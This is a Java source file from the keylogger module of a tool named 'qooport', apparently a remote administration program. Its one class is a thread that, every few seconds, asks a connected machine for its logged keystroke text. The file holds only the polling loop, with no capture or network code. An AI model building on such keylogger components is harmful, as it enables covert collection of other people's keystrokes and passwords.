/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package qooport.modulos.keylogger;

import qooport.asociado.Asociado;

/**
 *
 * @author alberto
 */
public class PedirKeyLogger extends Thread {

    private Asociado servidor;
    private int segundos;
    private boolean activo;

    public PedirKeyLogger(Asociado servidor, int segundos) {
        this.servidor = servidor;
        this.segundos = segundos;
    }

    public Asociado getServidor() {
        return servidor;
    }

    public void setServidor(Asociado servidor) {
        this.servidor = servidor;
    }

    public int getSegundos() {
        return segundos;
    }

    public void setSegundos(int segundos) {
        this.segundos = segundos;
    }

    public boolean isActivo() {
        return activo;
    }

    public void setActivo(boolean activo) {
        this.activo = activo;
    }

    public void iniciar() {
        activo = true;
        try {
            start();
        } catch (Exception e) {
        }
    }

    public void detener() {
        activo = false;
//        try {
//            stop();
//        } catch (Exception e) {
//        }
    }

    @Override
    public void run() {
        while (true) {
            try {
                sleep(segundos * 1000);
            } catch (InterruptedException ex) {
            }
            if (activo) {
                servidor.pedirKeyLoggerTexto();
            }
        }
    }

}
